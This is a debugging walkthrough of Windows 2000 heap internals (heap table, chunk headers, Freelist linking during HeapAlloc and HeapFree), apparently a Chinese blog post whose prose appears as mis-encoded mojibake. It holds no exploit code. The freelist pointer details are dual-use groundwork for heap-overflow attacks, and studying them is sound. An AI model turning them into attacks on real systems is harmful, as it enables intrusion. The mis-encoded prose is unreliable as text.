<h3 id="å“ªä¸€å—æ˜¯å †"><a href="#å“ªä¸€å—æ˜¯å †" class="headerlink" title="å“ªä¸€å—æ˜¯å †?"></a>å“ªä¸€å—æ˜¯å †?</h3><p>ollydbgèµ·æ¥å®æ—¶è°ƒè¯•æ—¶,ç¨‹åºæ˜¯åœåœ¨0x40101Dè¿™ä¸ªåœ°æ–¹çš„</p>
<p>åœ¨åæ±‡ç¼–è§†å›¾ä¸ŠINT3å‘ç”Ÿäºè°ƒç”¨HeapCreateå‡½æ•°ä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171320225.png" alt="image-20220919171320225"></p>
<p>æ˜¾ç„¶æ­¤æ—¶EAXå°±å­˜æ”¾çš„HeapCreateçš„è¿”å›å€¼,å³hpå¥æŸ„,ä¹Ÿå°±æ˜¯ç”³è¯·çš„å †ç©ºé—´çš„åŸºåœ°å€0x390000,æ˜¾ç„¶æ˜¯ä¸€ä¸ªç”¨æˆ·åœ°å€ç©ºé—´çš„å€¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171420641.png" alt="image-20220919171420641"></p>
<p>åœ¨å†…å­˜ç•Œé¢ä¸Šå®ƒé•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171519939.png" alt="image-20220919171519939"></p>
<p>å¤§å°0x1000æ˜¯æˆ‘ä»¬ç»™CreateHeapæŒ‡å®šçš„åˆå§‹å€¼</p>
<p>åŒå‡»è¯¥åœ°å€åˆ°å†…å­˜è§†å›¾çœ‹çœ‹</p>
<p>ä»0x390000å¼€å§‹,å †è¡¨ä¸­ä¸€æ¬¡æ˜¯æ®µè¡¨ç´¢å¼•,è™šè¡¨ç´¢å¼•,ç©ºè¡¨ä½¿ç”¨æ ‡è¯†,ç©ºè¡¨ç´¢å¼•åŒº</p>
<h3 id="å †å—ç»“æ„"><a href="#å †å—ç»“æ„" class="headerlink" title="å †å—ç»“æ„"></a>å †å—ç»“æ„</h3><p><img src="/WPS%E5%9B%BE%E7%89%87%E6%8B%BC%E5%9B%BE.png" alt="WPSå›¾ç‰‡æ‹¼å›¾"></p>
<p>ä¸¤è€…çš„åŒºåˆ«ä¸»è¦åœ¨äº[8,16)å­—èŠ‚,ç”±äºå ç”¨æ€çš„å †å—å·²ç»ä»ç©ºé—²é“¾è¡¨ä¸­å–ä¸‹,å› æ­¤ä¸éœ€è¦å†ç»´æŠ¤å‰åæŒ‡é’ˆ</p>
<p>ç©ºé—²æ€å †å—å°šæœªå¡«å……æ•°æ®,å› æ­¤è¿™ä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«ç”¨äºå‰åæŒ‡é’ˆ</p>
<p>å½“å ç”¨æ€çš„å †å—è¦å½’è¿˜çš„æ—¶å€™,è¿™ä¸¤ä¸ªå­—èŠ‚åˆå¾—å­˜æ”¾æŒ‡é’ˆ</p>
<p>è°ƒè¯•æ—¶,0x390688è¿™é‡Œæ˜¯Flink in freelistçš„ä½ç½®,è€ŒçœŸæ­£çš„å †å—èµ·å§‹ä½ç½®åº”è¯¥åœ¨å¾€å‰8ä¸ªå­—èŠ‚,å³0x390680ä½ç½®</p>
<p>ä¸€èˆ¬å¼•ç”¨å †å—çš„æŒ‡é’ˆéƒ½æ˜¯ä¼šè¶Šè¿‡8å­—èŠ‚çš„å¤´éƒ¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919192556999.png" alt="å°¾å—å¤´éƒ¨"></p>
<table>
<thead>
<tr>
<th>å—é¦–å±æ€§</th>
<th>å€¼</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>Self Size</td>
<td>0x130</td>
<td>è¯¥å°¾å—çš„dataåŒºå¤§å°<code>0x130*8=0x980</code>å­—èŠ‚<br />æ³¨æ„å•ä½æ˜¯8å­—èŠ‚,å¹¶ä¸”è¿™0x980æ˜¯åŒ…æ‹¬å †å—å¤´éƒ¨çš„</td>
</tr>
<tr>
<td>Previous chunk</td>
<td>0x80</td>
<td></td>
</tr>
<tr>
<td>Segment</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>Flags</td>
<td>0x10</td>
<td></td>
</tr>
<tr>
<td>Unused bytes</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>Tag Index</td>
<td>0</td>
<td></td>
</tr>
</tbody></table>
<p>Flink in freelistå’ŒBlink in freelistæ­¤æ—¶éƒ½æ˜¯æŒ‡å‘Freelist[0]è¿™ä¸ªç´¢å¼•é¡¹çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" alt="Freelist[0]"></p>
<p>å·¦æ‰‹æ‹‰å³æ‰‹,å³æ‰‹æ‹½å·¦æ‰‹</p>
<p>ç„¶ååé¢å…¨éƒ½æ˜¯0,å› ä¸ºå°šæœªä½¿ç”¨</p>
<p>å †å—çš„è¡Œä¸º</p>
<p>1.å †å—å¤§å°åŒ…æ‹¬äº†å—å—é¦–,ç”³è¯·32å­—èŠ‚,å®é™…åˆ†é…å †å—40å­—èŠ‚,å‰8å­—èŠ‚æ˜¯å †å—é¦–.è¿”å›çš„æŒ‡é’ˆæŒ‡å‘ç¬¬9å­—èŠ‚(ä¸‹æ ‡8)</p>
<p>2.å †å—çš„å•ä½æ˜¯8å­—èŠ‚,ä¸è¶³å…«å­—èŠ‚çš„æŒ‰ç…§å…«å­—èŠ‚åˆ†é…</p>
<p>3.åˆå§‹çŠ¶æ€ä¸‹å¿«è¡¨å’Œç©ºè¡¨éƒ½æ˜¯ç©º,åªæœ‰ä¸€ä¸ªFreelist[0]åé¢æ‹‰ç€ä¸€ä¸ªå°¾å—,è¿™ä¸ªå°¾å—åœ¨å †åç§»0x688å¤„</p>
<p>4.åˆ†é…çš„æ—¶å€™ä»å°¾å—å¤´ä¸Š(æ•´ä¸ªå°¾å—åŒ…æ‹¬å°¾å—é¦–éƒ½å¾—æ¢åœ°æ–¹)å¼€å§‹åˆ‡,åˆ‡èµ°ä¹‹åè¦ä¿®æ”¹å°¾å—å—é¦–çš„Self Sizeä¿¡æ¯,å¹¶ä¸”å°†æ–°çš„å°¾å—dataåœ°å€äº¤ç»™freelist[0]</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿç©ºè¡¨"><a href="#è°ƒè¯•è§‚å¯Ÿç©ºè¡¨" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿç©ºè¡¨"></a>è°ƒè¯•è§‚å¯Ÿç©ºè¡¨</h3><h4 id="ç©ºè¡¨ç´¢å¼•åŒºFreelist-128"><a href="#ç©ºè¡¨ç´¢å¼•åŒºFreelist-128" class="headerlink" title="ç©ºè¡¨ç´¢å¼•åŒºFreelist[128]"></a>ç©ºè¡¨ç´¢å¼•åŒºFreelist[128]</h4><p>ç©ºè¡¨ç´¢å¼•åŒºä½äºåç§»0x178å¤„,å³0x390178</p>
<p>ä¸€ä¸ªåˆšåˆå§‹åŒ–çš„å †,å…¶çŠ¶æ€å¦‚ä¸‹</p>
<p>1.åªæœ‰ä¸€ä¸ªç©ºé—²å¤§å—,å«åšå°¾å—</p>
<p>2.è¯¥å°¾å¿«ä½äºå †åç§»0x688å¤„</p>
<p>3.Freelist[0]æŒ‡å‘â€å°¾å—â€</p>
<p>4.é™¤é›¶å·ç©ºè¡¨ç´¢å¼•å¤–,å…¶ä½™å„é¡¹ç´¢å¼•æŒ‡å‘è‡ªå·±,å³æ²¡æœ‰ç©ºé—²å—</p>
<p>ç©ºè¡¨ç´¢å¼•,å³Freelistè¡¨,å…¶ç¬¬0é¡¹çš„åç§»å°±æ˜¯Freelistè¡¨çš„åç§»,0x178+0x390000&#x3D;0x390178,è¿™ä¸ªä½ç½®é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" alt="image-20220919184326162"></p>
<p>Freelist[0]ä¸ŠåªæŒ‚ç€å°¾å—,å› æ­¤å‰åæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘å°¾å—çš„,å°¾å—çš„åœ°å€æ˜¯0x00390688,å³å †åç§»0x688çš„åœ°æ–¹</p>
<p>å…¶ä»–çš„ç©ºè¡¨ç´¢å¼•Freelist[n]çš„ä¸¤ä¸ªæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘è‡ªå·±,æ•´ä¸ªFreelistæ•°ç»„ä¸€å…±æœ‰128é¡¹,æ¯é¡¹ä¸¤ä¸ª4å­—èŠ‚æŒ‡é’ˆ,å…±<code>128*4*2=1024=0x400</code>å­—èŠ‚,ä»0x390178åˆ°0x390578å…¨éƒ½æ˜¯Freelist</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919190028685.png" alt="image-20220919190028685"></p>
<p>ä¸€ç›´æŒç»­åˆ°0x390578</p>
<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919190022123.png" alt="image-20220919190022123"></p>
<h4 id="åˆ†é…"><a href="#åˆ†é…" class="headerlink" title="åˆ†é…"></a>åˆ†é…</h4><p>é‡æ–°ä»win2kä¸Šç”¨odè°ƒè¯•äº†ä¸€ä¸‹,ç°åœ¨å †åŸºå€æ˜¯0x360000</p>
<p>ä¸‹é¢æ˜¯å…­æ¬¡åˆ†å‰²</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å †å¥æŸ„</th>
<th>å¸Œæœ›è¯·æ±‚å­—èŠ‚æ•°</th>
<th>å®é™…åˆ†é…å †å—çš„å­—èŠ‚æ•°</th>
</tr>
</thead>
<tbody><tr>
<td>h1</td>
<td>3</td>
<td>16</td>
</tr>
<tr>
<td>h2</td>
<td>5</td>
<td>16</td>
</tr>
<tr>
<td>h3</td>
<td>6</td>
<td>16</td>
</tr>
<tr>
<td>h4</td>
<td>8</td>
<td>16</td>
</tr>
<tr>
<td>h5</td>
<td>19</td>
<td>32</td>
</tr>
<tr>
<td>h6</td>
<td>24</td>
<td>32</td>
</tr>
</tbody></table>
<h5 id="åˆ†å‰²ä¹‹å‰"><a href="#åˆ†å‰²ä¹‹å‰" class="headerlink" title="åˆ†å‰²ä¹‹å‰"></a>åˆ†å‰²ä¹‹å‰</h5><p>åˆ†å‰²ä¹‹å‰çš„å°¾å—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202335032.png" alt="image-20220919202335032"></p>
<p>flags&#x3D;0x10è¡¨ç¤ºå°¾å—</p>
<h5 id="ç¬¬ä¸€æ¬¡åˆ†å‰²"><a href="#ç¬¬ä¸€æ¬¡åˆ†å‰²" class="headerlink" title="ç¬¬ä¸€æ¬¡åˆ†å‰²"></a>ç¬¬ä¸€æ¬¡åˆ†å‰²</h5><p>ç¬¬ä¸€æ¬¡åˆ†å‰²æ—¶</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202432017.png" alt="image-20220919202432017"></p>
<p>ESIä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°,æ˜¯CreateHeapè¿”å›çš„å †å¥æŸ„0x360000</p>
<p>8æ˜¯è¦åˆå§‹åŒ–è¯¥ç‰‡ç©ºé—´ä¸º0,å®é™…æ˜¯æšä¸¾å€¼HEAP_ZERO_MEMORY</p>
<p>3æ˜¯å¸Œæœ›ç”³è¯·çš„å­—èŠ‚æ•°</p>
<p>ediä¸­æ”¾ç€çš„æ˜¯AllocateHeapå‡½æ•°çš„åœ°å€</p>
<p>call ediä¹‹å0x360680é™„è¿‘å‘ç”Ÿäº†å˜åŒ–</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919204334903.png" alt="image-20220919204334903"></p>
<p>callçš„è¿”å›å€¼æ”¾åœ¨eaxä¸­,æ­¤æ—¶ä¸º0x360688,è¿™æ„å‘³ç€h1å †å—dataåœ°å€,è¿™æ˜¯åŸæ¥çš„å°¾å—data</p>
<p>é‚£ä¹ˆh1å †å—é¦–å°±å¾—åœ¨0x360680äº†,è¿™æ˜¯åŸæ¥çš„å°¾å—é¦–</p>
<p>h1å †å—é¦–ä¸­çš„æ•°æ®:</p>
<p>å¤§å°0x0002,(å•ä½8å­—èŠ‚),å³16å­—èŠ‚</p>
<p>ä¸Šä¸€ä¸ªå—çš„å¤§å°0x0008(å•¥æ„ä¹‰å‘¢?)</p>
<p>Flags&#x3D;01,busy</p>
<p>unused bytes&#x3D;0x0D,13ä¸ªå­—èŠ‚?</p>
<p>ç„¶åh1å †å—æ•°æ®çš„å‰å››ä¸ªå­—èŠ‚ç¡®å®ç½®é›¶äº†,ä½†æ˜¯åé¢å››ä¸ªå­—èŠ‚ä¾ç„¶ä¿æŒç€å°¾å—é¦–ç•™ä¸‹çš„æŒ‡é’ˆ,å› ä¸ºæˆ‘ä»¬åªå¸Œæœ›ç”³è¯·3ä¸ªå­—èŠ‚,æœ¬æ¥ç»™16ä¸ªå­—èŠ‚å…¶ä¸­dataå 8å­—èŠ‚å°±å·²ç»æ˜¯ä¸ºäº†éµå®ˆç¡¬æ€§è¦æ±‚,8å­—èŠ‚å¯¹é½äº†,å‰å››ä¸ªå­—èŠ‚å¤Ÿç”¨äº†,åé¢å››ä¸ªå­—èŠ‚ä¸ç”¨æ¸…é›¶</p>
<p>å°¾å—æ­¤æ—¶çš„å¤§å°0x12Eç›¸æ¯”äº0x130å°‘äº†2(å•ä½8å­—èŠ‚),æ­£å¥½æ˜¯h1å †å—é¦–å’Œdataçš„å¤§å°,å°¾å—çš„ç¬¬äºŒä¸ªå…«å­—èŠ‚ä¾ç„¶æ˜¯ä¸¤ä¸ªæŒ‡é’ˆ,æŒ‡å‘freelist[0]</p>
<p>æ­¤æ—¶freelist[0]@0x00360178å…¶ä¸Šçš„å€¼ä¹Ÿä¿®æ”¹äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919205258485.png" alt="image-20220919205258485"></p>
<p>å®æ—¶ä¿®æ”¹ä¸ºå½“å‰å°¾å—dataåœ°å€</p>
<h5 id="å…­æ¬¡åˆ†å‰²å"><a href="#å…­æ¬¡åˆ†å‰²å" class="headerlink" title="å…­æ¬¡åˆ†å‰²å"></a>å…­æ¬¡åˆ†å‰²å</h5><p>ç»§ç»­è°ƒè¯•,ç›´åˆ°å…­æ¬¡åˆ†é…å®Œæˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,å¸Œæœ›5å­—èŠ‚äºæ˜¯åªæœ‰dataå‰5å­—èŠ‚åˆå§‹åŒ–ä¸º0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,å¸Œæœ›6å­—èŠ‚äºæ˜¯åªæœ‰dataå‰6å­—èŠ‚åˆå§‹åŒ–ä¸º0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//å°¾å—</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å°¾å—å¤§å°å·²ç»å‡ä¸º0x120(å•ä½8å­—èŠ‚),å…¶ä¸¤ä¸ªæŒ‡é’ˆä»ç„¶æ˜¯æŒ‡å‘0x00360178,</p>
<p>freelist[0]@0x00360178çš„ä¸¤ä¸ªæŒ‡é’ˆå¿…ç„¶ä¹ŸæŒ‡å‘äº†0x360708</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919210617841.png" alt="image-20220919210617841"></p>
<p>è¢«ç”³è¯·èµ°çš„å †å—,å¯¹äºç³»ç»Ÿä¸­çš„å †æ¥è¯´,ç®—æ˜¯å¹³ç™½æ— æ•…å°±æ²¡äº†,æ— æ³•é€šè¿‡ä»»ä½•æ–¹å¼ç´¢å¼•åˆ°æ‹¿èµ°çš„å †å—,åªæœ‰æ˜¯ç”¨æˆ·ç¨‹åºå½’è¿˜çš„æ—¶å€™,ç³»ç»Ÿæ‰å¯ä»¥æŠŠå †å—é‡æ–°æ”¾åˆ°Freelisté‡Œé¢,è¿™æ—¶å€™å°±ä¸æ˜¯æ”¾åˆ°å°¾å—é‡Œé¢äº†,16å­—èŠ‚çš„å—(åŒ…æ‹¬é¦–éƒ¨)åº”è¯¥æ”¾åˆ°freelist[2]</p>
<h4 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h4><h5 id="é‡Šæ”¾h1"><a href="#é‡Šæ”¾h1" class="headerlink" title="é‡Šæ”¾h1"></a>é‡Šæ”¾h1</h5><p>é‡Šæ”¾æ˜¯ä»h1å¼€å§‹çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919211337324.png" alt="image-20220919211337324"></p>
<p>esi&#x3D;0x360000æ˜¯hpå¥æŸ„</p>
<p>dwflags&#x3D;0æ²¡æœ‰ä»»ä½•æ ‡å¿—</p>
<p>ebxæ˜¯h1å¥æŸ„,è¿™é‡Œè²Œä¼¼æœ‰ä¸€ä¸ªç¼–è¯‘ä¼˜åŒ–,åœ¨h1å †ç”³è¯·å®Œæ¯•ä¹‹å,h1å¥æŸ„æ˜¯æ”¾åœ¨eaxä¸­çš„,åœ¨h2å †ç”³è¯·ä¹‹å‰,eaxåˆæ”¾åˆ°äº†ebxä¸­,ä»é‚£åˆ°ç°åœ¨ebxä¸­ä¸€ç›´éƒ½æ˜¯h1å¥æŸ„æ²¡æœ‰æ”¹å˜</p>
<p>è°ƒç”¨ä¹‹åeax&#x3D;1,è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸ</p>
<p>æ­¤æ—¶çš„ h1å †å—@0x360680å‘ç”Ÿäº†å˜åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é‡Šæ”¾ä¹‹å‰</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">é‡Šæ”¾ä¹‹å</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 88 01 36 00 88 01 36 00  ......?6.?6.</span><br></pre></td></tr></table></figure>

<p>å…¶å˜åŒ–ä¸º,æ ‡å¿—ä½åˆå›å½’0,è¡¨ç¤ºç©ºé—²,ç¬¬äºŒä¸ªå…«å­—èŠ‚,åŸæ¥æ˜¯dataçš„å¼€å§‹ç°åœ¨åˆå˜æˆäº†ä¸¤ä¸ªæŒ‡é’ˆ,éƒ½æŒ‡å‘0x00360188</p>
<p>è¿™æ˜¯å•¥ä½ç½®å‘¢?</p>
<p>Freelist@0x00360178,</p>
<p>Freelist[0]@0x00360178</p>
<p>Freelist[1]@0x00360180</p>
<p>Freelist[2]@0x00360188</p>
<p>å³åŸæ¥çš„h1æ‰€åœ¨å †å—,ç°åœ¨é“¾æ¥å›äº†Freelist[2]ä¸Š</p>
<blockquote>
<p>æœ‰æ„æ€çš„æ˜¯,8å­—èŠ‚çš„å †å—é¦–+8å­—èŠ‚çš„data,å·²ç»æ˜¯å ç”¨å †å—çš„æœ€å°è§„æ ¼äº†,æœ€å°è§„æ ¼çš„å †å—é‡Šæ”¾ä¹‹åæ‰èƒ½æŒ‚åˆ°Freelist[2]ä¸Š,é‚£ä¹ˆFreelist[1]ä¸Šåº”è¯¥æŒ‚ä»€ä¹ˆå‘¢?</p>
<p>å¦‚æœæ ¹æ®Freelist[n]æŒ‡å‘çš„å †å—å¤§å°ä¸º8n(åŒ…æ‹¬å †å—é¦–å’Œå †å—data),é‚£ä¹ˆFreelist[1]æŒ‡å‘çš„å †å—åº”è¯¥æ˜¯8å­—èŠ‚çš„é¦–+0å­—èŠ‚çš„data,è¿™ä¸ªå †å—æ˜¯ä¸ªå¯‚å¯å§</p>
</blockquote>
<h5 id="å‰ä¸‰æ¬¡é‡Šæ”¾å"><a href="#å‰ä¸‰æ¬¡é‡Šæ”¾å" class="headerlink" title="å‰ä¸‰æ¬¡é‡Šæ”¾å"></a>å‰ä¸‰æ¬¡é‡Šæ”¾å</h5><p>å‰ä¸‰æ¬¡é‡Šæ”¾åˆ†åˆ«æ˜¯h1,h3,h5,è¿™æ˜¯ä¸‰ä¸ªä¸è¿ç»­çš„å †å—,ä¸ä¼šå‘ç”Ÿåˆå¹¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//ä¸‰æ¬¡é‡Šæ”¾å‰</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,å¸Œæœ›5å­—èŠ‚äºæ˜¯åªæœ‰dataå‰5å­—èŠ‚åˆå§‹åŒ–ä¸º0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,å¸Œæœ›6å­—èŠ‚äºæ˜¯åªæœ‰dataå‰6å­—èŠ‚åˆå§‹åŒ–ä¸º0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//å°¾å—</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//ä¸‰æ¬¡é‡Šæ”¾å</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 A8 06 36 00 88 01 36 00  ......?6.?6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2</span><br><span class="line">003606A0  02 00 02 00 00 00 0A 00 88 01 36 00 88 06 36 00  ......?6.?6.//h3</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 00 0D 00 98 01 36 00 98 01 36 00  ......?6.?6.//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//å°¾å—</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‰æ¬¡é‡Šæ”¾å‰åh2,h4,h6æ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–,å°¾å—ä¹Ÿæ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–</p>
<p>ä¸‰æ¬¡é‡Šæ”¾å‰åå‘ç”Ÿå˜åŒ–çš„æœ‰h1,h3,h5,å‘ç”Ÿçš„å˜åŒ–ä¹Ÿæ˜¯å¾ˆæœ‰è§„å¾‹çš„,é¦–å…ˆæ˜¯flagä»1åˆ°0,æ„æ€æ˜¯ä»å ç”¨åˆ°ç©ºé—²</p>
<p>æ¯ä¸ªå †å—çš„ç¬¬äºŒä¸ªå…«å­—èŠ‚,éƒ½å˜æˆäº†ä¸¤ä¸ªæŒ‡é’ˆ</p>
<table>
<thead>
<tr>
<th>é‡Šæ”¾å †å—</th>
<th>é‡Šæ”¾åçš„å‰ä¸€ä¸ªæŒ‡é’ˆå€¼</th>
<th>é‡Šæ”¾åçš„åä¸€ä¸ªæŒ‡é’ˆå€¼</th>
</tr>
</thead>
<tbody><tr>
<td>h1@00360688</td>
<td>0x003606A8</td>
<td>0x00360188</td>
</tr>
<tr>
<td>h3@003606A8</td>
<td>0x00360188</td>
<td>0x00360688</td>
</tr>
<tr>
<td>h5@003606C8</td>
<td>0x00360198</td>
<td>0x00360198</td>
</tr>
<tr>
<td>Freelist[2]@0x00360188</td>
<td>0x00360688</td>
<td>0x003606A8</td>
</tr>
<tr>
<td>Freelist[4]@0x00360198</td>
<td>0x003606C8</td>
<td>0x003606C8</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>Freelistè¡¨ä¹Ÿå‘ç”Ÿäº†å˜åŒ–</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919214452673.png" alt="Freelist"></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Freelist[<span class="number">0</span>]@<span class="number">0x00360178</span></span><br><span class="line">Freelist[<span class="number">1</span>]@<span class="number">0x00360180</span></span><br><span class="line">Freelist[<span class="number">2</span>]@<span class="number">0x00360188</span></span><br><span class="line">Freelist[<span class="number">3</span>]@<span class="number">0x00360190</span></span><br><span class="line">Freelist[<span class="number">4</span>]@<span class="number">0x00360198</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç›¸å½“äºç”»åœ¨ä¸‹å›¾ä¸­çš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920080020364.png" alt="image-20220920080020364"></p>
<h4 id="åˆå¹¶"><a href="#åˆå¹¶" class="headerlink" title="åˆå¹¶"></a>åˆå¹¶</h4><p>å‰é¢ä¸‰ä¸ªé‡Šæ”¾,éƒ½ä¸æ˜¯è¿ç»­çš„å †åœ°å€,ç°åœ¨è¦å†é‡Šæ”¾h4,ä»–å’Œh3,h5æ˜¯è¿ç»­çš„,åˆä¼šå‘ç”Ÿä»€ä¹ˆå‘¢?</p>
